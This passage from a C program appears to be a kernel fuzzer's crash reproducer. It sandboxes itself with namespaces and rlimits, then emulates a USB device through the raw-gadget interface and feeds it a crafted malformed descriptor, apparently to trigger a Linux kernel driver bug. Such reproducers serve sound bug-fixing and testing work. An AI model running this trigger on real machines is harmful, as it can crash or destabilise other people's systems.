        usb_raw_ep0_stall(fd);
        continue;
      }
      response_data = NULL;
      response_length = event.ctrl.wLength;
    }
    if ((event.ctrl.bRequestType & USB_TYPE_MASK) == USB_TYPE_STANDARD &&
        event.ctrl.bRequest == USB_REQ_SET_CONFIGURATION) {
      rv = configure_device(fd);
      if (rv < 0) {
        return rv;
      }
    }
    struct usb_raw_ep_io_data response;
    response.inner.ep = 0;
    response.inner.flags = 0;
    if (response_length > sizeof(response.data))
      response_length = 0;
    if (event.ctrl.wLength < response_length)
      response_length = event.ctrl.wLength;
    response.inner.length = response_length;
    if (response_data)
      memcpy(&response.data[0], response_data, response_length);
    else
      memset(&response.data[0], 0, response_length);
    if (event.ctrl.bRequestType & USB_DIR_IN) {
      rv = usb_raw_ep0_write(fd, (struct usb_raw_ep_io*)&response);
    } else {
      rv = usb_raw_ep0_read(fd, (struct usb_raw_ep_io*)&response);
    }
    if (rv < 0) {
      return rv;
    }
  }
  sleep_ms(200);
  return fd;
}

static volatile long syz_usb_connect(volatile long a0, volatile long a1,
                                     volatile long a2, volatile long a3)
{
  uint64_t speed = a0;
  uint64_t dev_len = a1;
  const char* dev = (const char*)a2;
  const struct vusb_connect_descriptors* descs =
      (const struct vusb_connect_descriptors*)a3;
  return syz_usb_connect_impl(speed, dev_len, dev, descs,
                              &lookup_connect_response_out_generic);
}

static void setup_common()
{
  if (mount(0, "/sys/fs/fuse/connections", "fusectl", 0, 0)) {
  }
}

static void setup_binderfs()
{
  if (mkdir("/dev/binderfs", 0777)) {
  }
  if (mount("binder", "/dev/binderfs", "binder", 0, NULL)) {
  }
  if (symlink("/dev/binderfs", "./binderfs")) {
  }
}

static void loop();

static void sandbox_common()
{
  prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
  setsid();
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  setrlimit(RLIMIT_AS, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 32 << 20;
  setrlimit(RLIMIT_MEMLOCK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  setrlimit(RLIMIT_FSIZE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  setrlimit(RLIMIT_STACK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 128 << 20;
  setrlimit(RLIMIT_CORE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 256;
  setrlimit(RLIMIT_NOFILE, &rlim);
  if (unshare(CLONE_NEWNS)) {
  }
  if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL)) {
  }
  if (unshare(CLONE_NEWIPC)) {
  }
  if (unshare(0x02000000)) {
  }
  if (unshare(CLONE_NEWUTS)) {
  }
  if (unshare(CLONE_SYSVSEM)) {
  }
  typedef struct {
    const char* name;
    const char* value;
  } sysctl_t;
  static const sysctl_t sysctls[] = {
      {"/proc/sys/kernel/shmmax", "16777216"},
      {"/proc/sys/kernel/shmall", "536870912"},
      {"/proc/sys/kernel/shmmni", "1024"},
      {"/proc/sys/kernel/msgmax", "8192"},
      {"/proc/sys/kernel/msgmni", "1024"},
      {"/proc/sys/kernel/msgmnb", "1024"},
      {"/proc/sys/kernel/sem", "1024 1048576 500 1024"},
  };
  unsigned i;
  for (i = 0; i < sizeof(sysctls) / sizeof(sysctls[0]); i++)
    write_file(sysctls[i].name, sysctls[i].value);
}

static int wait_for_loop(int pid)
{
  if (pid < 0)
    exit(1);
  int status = 0;
  while (waitpid(-1, &status, __WALL) != pid) {
  }
  return WEXITSTATUS(status);
}

// 减少进程的权限，只保留必要的Linux能力
static void drop_caps(void)
{
  struct __user_cap_header_struct cap_hdr = {};
  struct __user_cap_data_struct cap_data[2] = {};
  cap_hdr.version = _LINUX_CAPABILITY_VERSION_3;
  cap_hdr.pid = getpid();
  if (syscall(SYS_capget, &cap_hdr, &cap_data))
    exit(1);
  const int drop = (1 << CAP_SYS_PTRACE) | (1 << CAP_SYS_NICE);
  cap_data[0].effective &= ~drop;
  cap_data[0].permitted &= ~drop;
  cap_data[0].inheritable &= ~drop;
  if (syscall(SYS_capset, &cap_hdr, &cap_data))
    exit(1);
}

// 设置沙箱环境，限制资源使用，创建新的网络命名空间等
static int do_sandbox_none(void)
{
  if (unshare(CLONE_NEWPID)) {
  }
  int pid = fork();
  if (pid != 0)
    return wait_for_loop(pid);
  setup_common();
  sandbox_common();
  drop_caps();
  initialize_netdevices_init();
  if (unshare(CLONE_NEWNET)) {
  }
  write_file("/proc/sys/net/ipv4/ping_group_range", "0 65535");
  initialize_tun();
  initialize_netdevices();
  setup_binderfs();
  loop();
  exit(1);
}

static void close_fds()
{
  for (int fd = 3; fd < MAX_FDS; fd++)
    close(fd);
}

void loop(void)
{
  memcpy((void*)0x20000140,
         "\x12\x01\x00\x00\xab\xbe\x67\x40\xe9\x17\x4e\x8b\x08\x9c\x00\x00\x00"
         "\x01\x09\x02\x12\x00\x01\x00\x00\x00\x00\x09\x04\x00\x08\x00\xff",
         33);
  syz_usb_connect(0, 0x24, 0x20000140, 0);
  close_fds();
}
int main(void)
{
  syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  do_sandbox_none();
  return 0;
}
```


